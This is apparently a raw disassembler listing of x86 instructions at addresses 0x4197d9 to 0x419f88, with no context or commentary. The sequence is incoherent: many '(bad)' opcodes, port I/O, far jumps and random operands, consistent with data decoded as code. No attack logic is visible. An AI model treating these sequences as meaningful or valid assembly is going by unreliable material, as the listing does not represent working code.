  4197d9:	test   eax,0x1bbdfab2
  4197de:	add    bh,dl
  4197e0:	cmp    esp,DWORD PTR [ebx]
  4197e2:	(bad)  
  4197e3:	popf   
  4197e4:	lds    edi,FWORD PTR [eax-0x51]
  4197e7:	cmp    al,0x84
  4197e9:	jle    0x4197f3
  4197eb:	les    ecx,FWORD PTR [esi+0x48]
  4197ee:	jns    0x419779
  4197f0:	push   ebx
  4197f1:	out    0xb3,al
  4197f3:	neg    DWORD PTR [edi-0xb81265f]
  4197f9:	adc    eax,0x89327372
  4197fe:	int    0x47
  419800:	aam    0xa7
  419802:	xchg   ebp,eax
  419803:	(bad)  
  419805:	inc    eax
  419806:	jne    0x419876
  419808:	mov    ah,0x39
  41980a:	lock ja 0x4197dc
  41980d:	push   edi
  41980e:	ror    BYTE PTR [edi],cl
  419810:	(bad)  
  419811:	pop    eax
  419812:	pusha  
  419813:	sbb    dl,BYTE PTR [edi+0x452edbbf]
  419819:	or     al,0x37
  41981b:	jp     0x419854
  41981d:	mov    edi,0x8df38f5d
  419822:	pop    ebp
  419823:	push   es
  419824:	fdivr  DWORD PTR [esi+0x743d19ff]
  41982a:	sbb    bh,BYTE PTR [esi+0x76708fd7]
  419830:	push   ecx
  419831:	sub    BYTE PTR [edi],dl
  419833:	inc    edi
  419834:	xchg   edx,eax
  419835:	rcl    BYTE PTR [ebx],cl
  419837:	inc    ebx
  419838:	dec    ebx
  419839:	and    eax,0xe5311231
  41983e:	add    BYTE PTR [edx-0x61],0x24
  419842:	xor    edi,edi
  419844:	loop   0x41988c
  419846:	jno    0x419861
  419848:	mov    edx,ecx
  41984a:	sub    eax,0xe2e69ad8
  41984f:	mov    DWORD PTR [ebx-0x1f],ebx
  419852:	fwait
  419853:	xchg   ebx,eax
  419854:	scas   al,BYTE PTR es:[edi]
  419855:	adc    BYTE PTR [edi+0x3a],ah
  419858:	das    
  419859:	jnp    0x419811
  41985b:	push   ds
  41985c:	jo     0x419897
  41985e:	push   ds
  41985f:	stos   BYTE PTR es:[edi],al
  419860:	lods   eax,DWORD PTR ds:[esi]
  419861:	cmp    dl,0xda
  419864:	mov    DWORD PTR [eax+eax*8-0x200fc5],ecx
  41986b:	cmp    bh,BYTE PTR [ebx]
  41986d:	(bad)  
  41986e:	pop    ebx
  41986f:	dec    ebp
  419870:	or     cl,0xf1
  419873:	mov    esp,0x588cefcf
  419878:	in     eax,dx
  419879:	pop    ebp
  41987a:	imul   ebx,DWORD PTR [edx+0x25],0xabca415e
  419881:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419882:	cmp    BYTE PTR [eax+0xdfc1703],ah
  419888:	dec    edi
  419889:	retf   0xec97
  41988c:	jmp    0x41989c
  41988e:	xchg   esi,eax
  41988f:	(bad)  
  419891:	int3   
  419892:	jge    0x4198f3
  419894:	sar    esp,1
  419896:	push   es
  419897:	(bad)  
  419898:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419899:	pop    DWORD PTR [esi-0x49ed8d9a]
  41989f:	xor    al,0xf0
  4198a1:	fisub  DWORD PTR [ecx-0x1261c7c6]
  4198a7:	lods   al,BYTE PTR ds:[esi]
  4198a8:	mov    dl,0x2
  4198aa:	out    dx,eax
  4198ab:	in     al,dx
  4198ac:	adc    BYTE PTR [ebp-0x5b],ah
  4198af:	loopne 0x41987c
  4198b1:	fisttp QWORD PTR fs:[eax+0x31b08513]
  4198b8:	adc    al,0xf5
  4198ba:	sbb    dl,0x2f
  4198bd:	adc    esp,DWORD PTR [ecx+ebp*8]
  4198c0:	fld    DWORD PTR [ecx-0x3594a634]
  4198c6:	(bad)  
  4198c7:	jb     0x419927
  4198c9:	lea    ebp,[ebx+0x40]
  4198cc:	sbb    BYTE PTR [ebx+0x302edb90],0x36
  4198d3:	mov    WORD PTR [ebx-0x2a3f88ea],?
  4198d9:	lahf   
  4198da:	pop    ds
  4198db:	xchg   esp,eax
  4198dc:	jne    0x4198a3
  4198de:	push   edx
  4198df:	test   DWORD PTR [edx+0x4b9917df],esi
  4198e5:	cld    
  4198e6:	fwait
  4198e7:	mov    dh,0xa
  4198e9:	ins    DWORD PTR es:[edi],dx
  4198ea:	shl    BYTE PTR [esi-0x6d],cl
  4198ed:	outs   dx,BYTE PTR ds:[esi]
  4198ee:	std    
  4198ef:	jne    0x419911
  4198f1:	jl     0x419958
  4198f3:	shr    DWORD PTR [edi+0x1c929b52],1
  4198f9:	mov    ds:0x217a51eb,eax
  4198fe:	push   edx
  4198ff:	int3   
  419900:	mov    ds:0x21f22f5,al
  419905:	loopne 0x4198af
  419907:	enter  0x2e03,0x82
  41990b:	cdq    
  41990c:	out    0xbe,eax
  41990e:	daa    
  41990f:	hlt    
  419910:	enter  0x67ff,0xff
  419914:	loopne 0x4198d9
  419916:	leave  
  419917:	call   0x31efbb05
  41991c:	mov    ch,0x2e
  41991e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41991f:	adc    DWORD PTR [edx-0x41],ebx
  419922:	mov    esp,0x9c16639b
  419927:	out    dx,al
  419928:	adc    eax,0x25124891
  41992d:	ror    BYTE PTR [ebp+0x39],1
  419930:	into   
  419931:	icebp  
  419932:	nop
  419933:	outs   dx,BYTE PTR ds:[esi]
  419934:	mov    ?,WORD PTR [esi-0x42]
  419937:	sub    eax,0xcd24b010
  41993c:	shl    BYTE PTR ds:0x35569c43,1
  419942:	inc    ebp
  419943:	(bad)  
  419944:	jns    0x41991e
  419946:	jnp    0x4198e9
  419948:	bound  esi,QWORD PTR [ecx-0x5eb7e963]
  41994e:	dec    edi
  41994f:	sbb    DWORD PTR [ebx+0x61],esp
  419952:	(bad)  
  419953:	or     esi,DWORD PTR [esi+0x36]
  419956:	std    
  419957:	sub    dl,BYTE PTR [esi+0x2d]
  41995a:	xchg   BYTE PTR [eax],dh
  41995c:	(bad)  
  41995d:	cdq    
  41995e:	mov    bl,0x2d
  419960:	pop    ds
  419961:	enter  0x5460,0x3e
  419965:	xor    esp,DWORD PTR [ebp-0x66]
  419968:	leave  
  419969:	xchg   BYTE PTR [edx+0x6c],bh
  41996c:	pushf  
  41996d:	lock shl ebp,1
  419970:	not    DWORD PTR [edi]
  419972:	mov    edx,0x30edeebc
  419977:	icebp  
  419978:	addr16 jp 0x4199af
  41997b:	mov    ah,0xee
  41997d:	xchg   esi,eax
  41997e:	pop    edx
  41997f:	adc    eax,0x337c2e0f
  419984:	inc    esi
  419985:	or     ah,BYTE PTR [esi+edx*1]
  419988:	and    DWORD PTR [eax+0x5b],ebx
  41998b:	jmp    0x83547245
  419990:	sbb    eax,0x3ff07f17
  419995:	outs   dx,BYTE PTR ds:[esi]
  419996:	addr16 mov edx,0x17a8f1cf
  41999c:	add    al,0xc6
  41999e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41999f:	cmp    DWORD PTR [esp-0x2d],0xffffffc3
  4199a4:	sub    al,0xad
  4199a6:	mov    edi,DWORD PTR [ebx+0x69670f7b]
  4199ac:	retf   
  4199ad:	cs es xchg edx,eax
  4199b0:	xchg   ecx,eax
  4199b1:	and    DWORD PTR [eax],edi
  4199b3:	ins    DWORD PTR es:[edi],dx
  4199b4:	push   eax
  4199b5:	and    BYTE PTR [edi],dh
  4199b7:	inc    ecx
  4199b8:	push   ebx
  4199b9:	push   ebx
  4199ba:	xchg   ebp,eax
  4199bb:	fidiv  DWORD PTR [edx+0x1f]
  4199be:	inc    ecx
  4199bf:	xchg   edx,eax
  4199c0:	mov    bh,0x72
  4199c2:	mov    cl,al
  4199c4:	and    al,0x43
  4199c6:	les    ecx,FWORD PTR [eax]
  4199c8:	sbb    BYTE PTR ds:0xd5f87311,al
  4199ce:	stc    
  4199cf:	in     eax,dx
  4199d0:	xchg   ebp,eax
  4199d1:	cwde   
  4199d2:	cmp    edx,ebp
  4199d4:	fidiv  DWORD PTR [eax+0x60c14afb]
  4199da:	mov    eax,ds:0x9fe514a6
  4199df:	repnz and DWORD PTR [ecx],edi
  4199e2:	cli    
  4199e3:	dec    eax
  4199e4:	fbld   TBYTE PTR [ebp+0x273bdc21]
  4199ea:	xchg   edi,eax
  4199eb:	sub    al,0x30
  4199ed:	push   0xd0aae651
  4199f2:	shl    bl,cl
  4199f4:	ds pop edx
  4199f6:	push   edx
  4199f7:	pop    esp
  4199f8:	fsubr  st,st(3)
  4199fa:	pop    ebx
  4199fb:	inc    edx
  4199fc:	cs xchg edx,eax
  4199fe:	call   0xff4b8e27
  419a03:	imul   edi,DWORD PTR [ebp+0x3b],0x12
  419a07:	mov    ch,0xbc
  419a09:	inc    edx
  419a0a:	mul    esi
  419a0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419a0d:	inc    edi
  419a0e:	xor    al,0x9a
  419a10:	out    dx,eax
  419a11:	imul   ebx,edx,0x50f9e651
  419a17:	das    
  419a18:	mov    eax,0x27769f06
  419a1d:	out    0xf7,eax
  419a1f:	inc    ecx
  419a20:	test   BYTE PTR [edi+0x78],0xf3
  419a24:	mov    BYTE PTR [ebx],bh
  419a26:	dec    esp
  419a27:	add    bh,BYTE PTR [edx+edi*1+0x2ca18318]
  419a2e:	xchg   esp,eax
  419a2f:	jecxz  0x419a31
  419a31:	jmp    0x419a4f
  419a33:	mov    edx,0x91bc92d1
  419a38:	imul   esi,DWORD PTR [ecx+ebp*4+0x38],0xfd395498
  419a40:	jbe    0x419a95
  419a42:	or     ebx,ebx
  419a44:	repnz mul dl
  419a47:	lahf   
  419a48:	sti    
  419a49:	sub    BYTE PTR ds:0x5e00c908,bh
  419a4f:	popf   
  419a50:	push   es
  419a51:	(bad)  [eax-0x67]
  419a54:	ja     0x4199e6
  419a56:	cmp    edx,ebp
  419a58:	aaa    
  419a59:	mov    dl,0xcf
  419a5b:	sbb    BYTE PTR ds:0xaecd9cc5,al
  419a61:	push   es
  419a62:	jnp    0x419a00
  419a64:	sub    ch,BYTE PTR [ecx+ecx*4-0x5b]
  419a68:	xor    DWORD PTR [ecx],esi
  419a6a:	in     eax,0x9c
  419a6c:	sbb    ah,BYTE PTR [edx]
  419a6e:	test   eax,0xa75b3508
  419a73:	out    dx,eax
  419a74:	inc    esi
  419a75:	sub    eax,0xe2782348
  419a7a:	fs loopne 0x419a6c
  419a7d:	add    eax,0xdba7d2a
  419a82:	icebp  
  419a83:	inc    ecx
  419a84:	int    0xaa
  419a86:	lock adc eax,0x26eea349
  419a8c:	xor    eax,0x65ea3449
  419a91:	add    al,dh
  419a93:	mov    ds:0xc3058389,eax
  419a98:	in     eax,0x94
  419a9a:	mov    edx,0xad38f86b
  419a9f:	call   0x84d1503b
  419aa4:	and    DWORD PTR [esi],ebx
  419aa6:	pop    eax
  419aa7:	sub    eax,0xb932fa79
  419aac:	push   ds
  419aad:	sub    al,0x4f
  419aaf:	and    dh,BYTE PTR [edx+ebp*8+0x16]
  419ab3:	push   es
  419ab4:	push   cs
  419ab5:	xchg   ebp,eax
  419ab6:	cmp    eax,0xc3faf5ed
  419abb:	or     ebp,DWORD PTR [edi]
  419abd:	push   eax
  419abe:	(bad)  
  419abf:	das    
  419ac0:	pop    esp
  419ac1:	jg     0x419acb
  419ac3:	sbb    DWORD PTR [ecx],ecx
  419ac5:	and    dl,BYTE PTR [ecx-0x62]
  419ac8:	sbb    eax,0xffffffeb
  419acb:	sbb    al,0x51
  419acd:	adc    DWORD PTR [esi+0x2d],0x3bc1d62d
  419ad4:	push   0x59dcd9d4
  419ad9:	sbb    ebp,DWORD PTR [ecx-0x61]
  419adc:	imul   edx,DWORD PTR [edi+0x5b],0x2
  419ae0:	ja     0x419a83
  419ae2:	stos   BYTE PTR es:[edi],al
  419ae3:	mov    esp,0x58af4847
  419ae8:	xlat   BYTE PTR ds:[ebx]
  419ae9:	shl    DWORD PTR [ebx+0x438c66b8],1
  419aef:	inc    ecx
  419af0:	sbb    al,0xa4
  419af2:	gs ins BYTE PTR es:[edi],dx
  419af4:	mov    cl,0x39
  419af6:	mov    WORD PTR [eax],?
  419af8:	js     0x419a97
  419afa:	scas   al,BYTE PTR es:[edi]
  419afb:	cmp    al,0x4e
  419afd:	cmc    
  419afe:	(bad)  
  419b00:	xchg   edi,eax
  419b01:	pop    ds
  419b02:	or     al,0x6c
  419b04:	clc    
  419b05:	push   0x30
  419b07:	cmp    eax,0x623eff27
  419b0c:	mov    edx,0x17d3080e
  419b11:	stos   BYTE PTR es:[edi],al
  419b12:	mov    dl,0x4
  419b14:	sub    bl,dl
  419b16:	test   eax,0xea384c5b
  419b1b:	(bad)
  419b1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419b1f:	leave  
  419b20:	push   ds
  419b21:	xchg   esi,eax
  419b22:	in     al,0x79
  419b24:	daa    
  419b25:	sbb    BYTE PTR [ecx-0x45b0e26],ch
  419b2b:	iret   
  419b2c:	daa    
  419b2d:	outs   dx,DWORD PTR ds:[esi]
  419b2e:	aad    0x78
  419b30:	mov    bl,0xd5
  419b32:	sti    
  419b33:	jmp    0xd9c3:0x9c575781
  419b3a:	push   eax
  419b3b:	mov    al,0xf2
  419b3d:	cmp    eax,0x4491cbf6
  419b42:	push   ebp
  419b43:	cwde   
  419b44:	(bad)  
  419b45:	icebp  
  419b46:	add    eax,0x1082bcb
  419b4b:	out    dx,al
  419b4c:	xor    al,0x64
  419b4e:	int3   
  419b4f:	mov    WORD PTR [eax+0x2c93e36b],gs
  419b55:	fucomp st(2)
  419b57:	jb     0x419b4d
  419b59:	outs   dx,BYTE PTR ds:[esi]
  419b5a:	leavew 
  419b5c:	mov    ds:0xe757c07,al
  419b61:	dec    edi
  419b62:	jne    0x419b36
  419b64:	and    al,0x4f
  419b66:	push   esp
  419b67:	cmc    
  419b68:	popf   
  419b69:	addr16 popf 
  419b6b:	sub    BYTE PTR [edx+edx*2],bh
  419b6e:	pushf  
  419b6f:	loop   0x419ba4
  419b71:	popa   
  419b72:	outs   dx,DWORD PTR ds:[esi]
  419b73:	xor    eax,0x6cc6b493
  419b78:	pop    ss
  419b79:	cmp    ebx,DWORD PTR [ebp+0x54032359]
  419b7f:	or     DWORD PTR [ebp+0x6f],edi
  419b82:	push   ebx
  419b83:	rol    ecx,1
  419b85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419b86:	int    0xda
  419b88:	leave  
  419b89:	sbb    bh,BYTE PTR [ebx+0x50cf4524]
  419b8f:	lds    ecx,FWORD PTR [ebx+0x6c]
  419b92:	mov    cl,0x6
  419b94:	sti    
  419b95:	jle    0x419bf1
  419b97:	push   cs
  419b98:	mov    BYTE PTR [ecx+0x2e58ebce],dh
  419b9e:	mov    WORD PTR [edi-0x40],?
  419ba1:	int3   
  419ba2:	sub    al,0x52
  419ba4:	xor    BYTE PTR [edi+0x63],al
  419ba7:	cdq    
  419ba8:	je     0x419bad
  419baa:	loop   0x419c28
  419bac:	in     al,0xc9
  419bae:	sub    BYTE PTR [esi],bl
  419bb0:	inc    edx
  419bb1:	or     eax,0x6c8a0760
  419bb6:	add    edx,esi
  419bb8:	mov    esp,0x1cca523a
  419bbd:	or     eax,0x73916f3e
  419bc2:	xchg   esp,eax
  419bc3:	push   edi
  419bc4:	jl     0x419ba4
  419bc6:	iret   
  419bc7:	sti    
  419bc8:	(bad)  
  419bc9:	pop    esi
  419bca:	je     0x419bb3
  419bcc:	rcr    DWORD PTR [edx-0x5b78746b],0x5f
  419bd3:	push   cs
  419bd4:	gs jnp 0x419bdc
  419bd7:	mov    eax,eax
  419bd9:	xchg   cl,ah
  419bdb:	inc    esi
  419bdc:	fldcw  WORD PTR [ebx+esi*1+0x6a]
  419be0:	xor    DWORD PTR [edi+0x41f637b5],ebp
  419be6:	add    edx,DWORD PTR [ecx-0x45]
  419be9:	xchg   BYTE PTR [ecx-0x1edd14d7],ch
  419bef:	xor    al,0xf5
  419bf1:	stos   BYTE PTR es:[edi],al
  419bf2:	xchg   edi,eax
  419bf3:	ins    DWORD PTR es:[edi],dx
  419bf4:	xchg   ecx,eax
  419bf5:	mov    edx,0xf342e23c
  419bfa:	cli    
  419bfb:	sbb    edi,DWORD PTR [edi-0x1e]
  419bfe:	mov    ecx,DWORD PTR [edi+0x6148d4da]
  419c04:	jp     0x419bdb
  419c06:	cs out dx,al
  419c08:	mov    ah,0xa1
  419c0a:	jbe    0x419c08
  419c0c:	mov    ah,0x89
  419c0e:	sub    al,0x9a
  419c10:	pop    ss
  419c11:	enter  0x2e5,0xa3
  419c15:	test   BYTE PTR [eax+0x71],bl
  419c18:	push   0x64bf3268
  419c1d:	push   esi
  419c1e:	sar    BYTE PTR [ecx+0x74],0xe9
  419c22:	jae    0x419bce
  419c24:	aam    0x2
  419c26:	jno    0x419c61
  419c28:	aas    
  419c29:	aas    
  419c2a:	fcomp  st(4)
  419c2c:	addr16 pop ebx
  419c2e:	repnz in al,0xd3
  419c31:	int    0x3d
  419c33:	jmp    0x419c07
  419c35:	imul   esi,DWORD PTR [eax],0x33148457
  419c3b:	cwde   
  419c3c:	inc    eax
  419c3d:	cli    
  419c3e:	ins    BYTE PTR es:[edi],dx
  419c3f:	stc    
  419c40:	push   esi
  419c41:	into   
  419c42:	add    cl,ch
  419c44:	mov    esp,0xc1c0b30e
  419c49:	(bad)  
  419c4b:	adc    al,0xb0
  419c4d:	push   esi
  419c4e:	adc    DWORD PTR [esi-0x7e378ccf],esp
  419c54:	shr    esp,0xc6
  419c57:	mov    ecx,0x326d0711
  419c5c:	scas   eax,DWORD PTR es:[edi]
  419c5d:	in     al,dx
  419c5e:	sbb    eax,0x4808756c
  419c63:	or     ah,bl
  419c65:	pop    es
  419c66:	cmp    dh,al
  419c68:	(bad)  
  419c69:	mov    ah,0x97
  419c6b:	inc    ecx
  419c6c:	mov    BYTE PTR [eax-0x6f],dh
  419c6f:	scas   eax,DWORD PTR es:[edi]
  419c70:	push   ebp
  419c71:	or     DWORD PTR [edx-0x1c],0xffffffa2
  419c75:	sub    esp,edx
  419c77:	sub    ah,BYTE PTR [ecx+0x6d]
  419c7a:	mov    cl,0x54
  419c7c:	and    eax,0x989c5571
  419c81:	aas    
  419c82:	dec    eax
  419c83:	mov    ?,ecx
  419c85:	push   esp
  419c86:	fisub  WORD PTR [edi]
  419c88:	pop    edi
  419c89:	(bad)  
  419c8a:	and    DWORD PTR [esi+0x36],esp
  419c8d:	fiadd  WORD PTR [ebx+0x2f]
  419c90:	and    BYTE PTR [ebx+0x6254cd18],ch
  419c96:	and    ebx,edi
  419c98:	(bad)  
  419c99:	push   0x19
  419c9b:	push   es
  419c9c:	push   0xffffffb1
  419c9e:	fist   WORD PTR [ebp+0x6018b704]
  419ca4:	xchg   esp,eax
  419ca5:	dec    edx
  419ca6:	mov    dl,0xce
  419ca8:	loope  0x419c3c
  419caa:	pop    es
  419cab:	xor    eax,0xd8c9f15a
  419cb0:	popf   
  419cb1:	adc    BYTE PTR ds:0xd8fdec6d,0xd6
  419cb8:	lods   eax,DWORD PTR ds:[esi]
  419cb9:	jne    0x419c7f
  419cbb:	cli    
  419cbc:	ins    DWORD PTR es:[edi],dx
  419cbd:	lods   eax,DWORD PTR ds:[esi]
  419cbe:	test   BYTE PTR cs:[eax-0x3d],dh
  419cc2:	xor    edx,DWORD PTR ds:0x4c2ecf7d
  419cc8:	test   al,0xc3
  419cca:	cmp    esi,DWORD PTR [ebp-0x67]
  419ccd:	sar    BYTE PTR [esi-0x60ff1250],1
  419cd3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419cd4:	scas   al,BYTE PTR es:[edi]
  419cd5:	mov    ebx,0x45664a7c
  419cda:	sub    eax,0x9c9b6e16
  419cdf:	rcr    BYTE PTR [edx],1
  419ce1:	std    
  419ce2:	add    BYTE PTR [esi-0x16],al
  419ce5:	push   esi
  419ce6:	nop
  419ce7:	mov    ds:0x8777be4,al
  419cec:	out    dx,eax
  419ced:	pushf  
  419cee:	xlat   BYTE PTR ds:[ebx]
  419cef:	pop    ds
  419cf0:	xchg   DWORD PTR [eax],ebx
  419cf2:	neg    ebp
  419cf4:	ss and eax,0x334fab32
  419cfa:	add    al,0x9c
  419cfc:	mov    ds:0x300f388e,eax
  419d01:	call   0x77b0:0xb2722e74
  419d08:	or     ebx,DWORD PTR [esi-0x5c]
  419d0b:	(bad)  
  419d0c:	daa    
  419d0d:	and    edx,edx
  419d0f:	stos   BYTE PTR es:[edi],al
  419d10:	shr    DWORD PTR [esi+0x79],cl
  419d13:	mov    DWORD PTR cs:[ecx-0x64],ebx
  419d17:	ss shl dh,0x5a
  419d1b:	jns    0x419d17
  419d1d:	adc    DWORD PTR [esi-0x23258994],0x9fc6481a
  419d27:	outs   dx,DWORD PTR ss:[esi]
  419d29:	add    esp,DWORD PTR [edx+eiz*8+0x4d]
  419d2d:	lock mov ss,WORD PTR [edi+0x20]
  419d31:	mov    ecx,0x7a8bcdd5
  419d36:	xor    DWORD PTR [ebp-0x59e3f612],edx
  419d3c:	jbe    0x419dab
  419d3e:	mov    WORD PTR [edx-0x3a],?
  419d41:	shr    DWORD PTR [ebx-0x14994fc2],1
  419d47:	(bad)  
  419d49:	mov    DWORD PTR [esi+eiz*1+0x5f],0x561003d5
  419d51:	add    ah,BYTE PTR [esi-0x27]
  419d54:	cmp    al,0x3c
  419d56:	call   0xfd091fc5
  419d5b:	xchg   ebx,eax
  419d5c:	shl    DWORD PTR [esp+ebp*4-0x4903a5fd],0xdb
  419d64:	push   0x49e58e74
  419d69:	(bad)  
  419d6a:	mov    ds:0xd62e552,eax
  419d6f:	cmp    esp,DWORD PTR [ecx]
  419d71:	xchg   ecx,eax
  419d72:	cmp    eax,0xbb01cc60
  419d77:	adc    bl,0x85
  419d7a:	jg     0x419d6c
  419d7c:	xchg   ch,dl
  419d7e:	sbb    al,0x6b
  419d80:	jl     0x419db6
  419d82:	pop    ebx
  419d83:	mov    eax,ds:0x7261c546
  419d88:	clc    
  419d89:	sbb    eax,0xb94c0437
  419d8e:	jg     0x419dc9
  419d90:	cmp    BYTE PTR ds:0x759d70cb,dh
  419d96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419d97:	int3   
  419d98:	mov    esp,0xa24848cc
  419d9d:	cmp    ch,BYTE PTR [ebp-0x21]
  419da0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419da1:	and    BYTE PTR [edi-0x4874ad04],0xf7
  419da8:	mov    esi,0xb7e5d101
  419dad:	xor    DWORD PTR [edx],ebx
  419daf:	fisub  WORD PTR [eax+0x1ce22580]
  419db5:	mov    dl,0x3c
  419db7:	out    0x26,eax
  419db9:	and    DWORD PTR [ecx],edi
  419dbb:	in     eax,dx
  419dbc:	mov    edx,0x757dd0b0
  419dc1:	mov    al,ds:0x364b4a64
  419dc6:	fisub  DWORD PTR [ebp-0x22]
  419dc9:	sahf   
  419dca:	ror    BYTE PTR [esi],0x40
  419dcd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419dce:	das    
  419dcf:	jmp    0x419dde
  419dd1:	(bad)  
  419dd3:	jg     0x419e24
  419dd5:	mov    dh,0x73
  419dd7:	jmp    0xabd524bb
  419ddc:	add    eax,0xaeac9e8d
  419de1:	xchg   BYTE PTR [ebx-0x40],dh
  419de4:	ror    DWORD PTR [ecx+esi*4-0x3771a64f],1
  419deb:	sub    edi,DWORD PTR [edi]
  419ded:	jmp    0x419d88
  419def:	inc    edi
  419df0:	inc    edi
  419df1:	pop    ebx
  419df2:	sbb    DWORD PTR [esi],ebx
  419df4:	rcl    BYTE PTR [ebp+edx*2+0xa1ac348],0x1f
  419dfc:	xchg   edi,eax
  419dfd:	jbe    0x419dde
  419dff:	pop    ecx
  419e00:	(bad)  
  419e01:	xchg   edx,eax
  419e02:	shr    DWORD PTR [esi+0x4252c89d],cl
  419e08:	fs pop ds
  419e0a:	mov    al,0xca
  419e0c:	(bad)  [ebp+0x2e]
  419e0f:	out    dx,al
  419e10:	jo     0x419db0
  419e12:	imul   esp,DWORD PTR ds:0x68968479,0xfffffff7
  419e19:	imul   edx,DWORD PTR [edi-0x44017139],0x68
  419e20:	or     eax,0xe5fab613
  419e25:	int    0xd8
  419e27:	iret   
  419e28:	sbb    al,0xc9
  419e2a:	sbb    ecx,edi
  419e2c:	mov    esp,0x942b72ef
  419e31:	rcl    BYTE PTR [esi+esi*1+0x42],1
  419e35:	pop    ecx
  419e36:	push   edi
  419e37:	mov    al,0x57
  419e39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419e3a:	xor    eax,0x3d4bc110
  419e3f:	push   ds
  419e40:	cwde   
  419e41:	mov    ?,WORD PTR [ebx-0x1f]
  419e44:	not    DWORD PTR [esp+esi*2+0x75]
  419e48:	out    dx,eax
  419e49:	ins    DWORD PTR es:[edi],dx
  419e4a:	push   ss
  419e4b:	mov    ah,0xd5
  419e4d:	int3   
  419e4e:	int3   
  419e4f:	mov    esi,0xc33231a1
  419e54:	fld    TBYTE PTR [ecx-0x1e16803a]
  419e5a:	loope  0x419dfc
  419e5c:	enter  0x64c8,0xdc
  419e60:	(bad)  
  419e61:	jge    0x419e5e
  419e63:	(bad)  
  419e64:	lods   eax,DWORD PTR ds:[esi]
  419e65:	ins    BYTE PTR es:[edi],dx
  419e66:	xor    bh,ch
  419e68:	mov    DWORD PTR [edi],0x35055490
  419e6e:	jl     0x419eb2
  419e70:	sub    dl,dh
  419e72:	mov    ch,0xd4
  419e74:	jl     0x419e3b
  419e76:	loop   0x419e43
  419e78:	test   DWORD PTR [esi+0x389caf8a],ecx
  419e7e:	rol    BYTE PTR [ebp-0x30],0xe6
  419e82:	(bad)  
  419e83:	sahf   
  419e84:	add    al,0x9f
  419e86:	pop    esi
  419e87:	(bad)  
  419e88:	int3   
  419e89:	xor    eax,DWORD PTR [ecx]
  419e8b:	and    eax,0xfc019569
  419e90:	pop    edi
  419e91:	sub    ah,bh
  419e93:	shr    al,0x20
  419e96:	mov    BYTE PTR [edi+ebx*1-0x4c],cl
  419e9a:	fsubr  QWORD PTR [eax-0x6c4cc431]
  419ea0:	mov    ds:0xfe26f99d,al
  419ea5:	in     al,dx
  419ea6:	and    BYTE PTR [esi],dl
  419ea8:	retf   0x70e4
  419eab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419eac:	lea    ebp,[ebp-0x22]
  419eaf:	sahf   
  419eb0:	in     al,dx
  419eb1:	or     DWORD PTR [eax],edx
  419eb3:	xor    BYTE PTR [eax+ebp*4-0x33],ah
  419eb7:	shl    DWORD PTR [ebp+0x4e],0xd9
  419ebb:	into   
  419ebc:	jg     0x419e5d
  419ebe:	addr16 jns 0x419f0b
  419ec1:	and    al,0xc4
  419ec3:	retf   
  419ec4:	sub    DWORD PTR [esi+0x3a],ebp
  419ec7:	or     DWORD PTR [esp+esi*4],ebx
  419eca:	mov    ds:0x7b761dc9,al
  419ecf:	test   DWORD PTR [edi-0x21286d15],0xcb6a3f06
  419ed9:	fistp  DWORD PTR [edx]
  419edb:	mov    ds:0xb60b813e,al
  419ee0:	pop    ds
  419ee1:	pop    ds
  419ee2:	adc    DWORD PTR [ebx],edx
  419ee4:	loopne 0x419ebe
  419ee6:	retf   
  419ee7:	out    0x40,eax
  419ee9:	or     ebx,esp
  419eeb:	pop    ebp
  419eec:	xor    bh,0x36
  419eef:	bound  esp,QWORD PTR [edi-0x10]
  419ef2:	adc    BYTE PTR [ebx-0x4bf9b612],dl
  419ef8:	idiv   ebx
  419efa:	cld    
  419efb:	and    ah,BYTE PTR [ebx-0x19]
  419efe:	xor    al,0x77
  419f00:	pushf  
  419f01:	and    BYTE PTR [ebp-0x1e],cl
  419f04:	xchg   DWORD PTR [eax+0x7f],edx
  419f07:	xchg   DWORD PTR [ebx],edi
  419f09:	or     dl,BYTE PTR [eax]
  419f0b:	push   ds
  419f0c:	xor    eax,0x9670082
  419f11:	cli    
  419f12:	loop   0x419f0a
  419f14:	add    DWORD PTR [ebx],eax
  419f16:	add    ecx,edi
  419f18:	mov    ds:0x606e14d5,al
  419f1d:	jmp    0x893a:0x3b404225
  419f24:	cmp    edi,DWORD PTR [ebx+ebx*4-0x50]
  419f28:	inc    ebp
  419f29:	adc    BYTE PTR [esi],dh
  419f2b:	js     0x419f7c
  419f2d:	adc    bl,BYTE PTR [edx+0x17]
  419f30:	dec    eax
  419f31:	stos   BYTE PTR es:[edi],al
  419f32:	xchg   ebp,eax
  419f33:	imul   DWORD PTR [ebp-0x7e]
  419f36:	lods   eax,DWORD PTR ds:[esi]
  419f37:	pop    esi
  419f38:	and    al,0x74
  419f3a:	sub    BYTE PTR [edx],cl
  419f3c:	add    BYTE PTR [ebx+0xd3de15e],0x64
  419f43:	(bad)  
  419f44:	jnp    0x419f1d
  419f46:	jle    0x419fb2
  419f48:	and    esi,DWORD PTR [esi+0x4e]
  419f4b:	ret    0x9ed6
  419f4e:	add    eax,0x5ce2f76d
  419f53:	jmp    0x4b17:0xade38c8f
  419f5a:	jl     0x419fa8
  419f5c:	shr    DWORD PTR [edx],cl
  419f5e:	sbb    DWORD PTR [edi],edi
  419f60:	mov    bh,0x96
  419f62:	fsubr  QWORD PTR [ecx+0x3]
  419f65:	cmp    eax,0xbf1b80f4
  419f6a:	jb     0x419fca
  419f6c:	jecxz  0x419f34
  419f6e:	mov    ds:0xad732db1,eax
  419f73:	ins    BYTE PTR es:[edi],dx
  419f74:	inc    ebx
  419f75:	mov    WORD PTR [edi+0x18],fs
  419f78:	lock mov al,ds:0x1b1e55b0
  419f7e:	in     al,0x66
  419f80:	adc    ebx,DWORD PTR [esp+ebx*2]
  419f83:	pop    ebx
  419f84:	bound  ebx,QWORD PTR [ebx+esi*4+0x56]
  419f88:	(bad)  
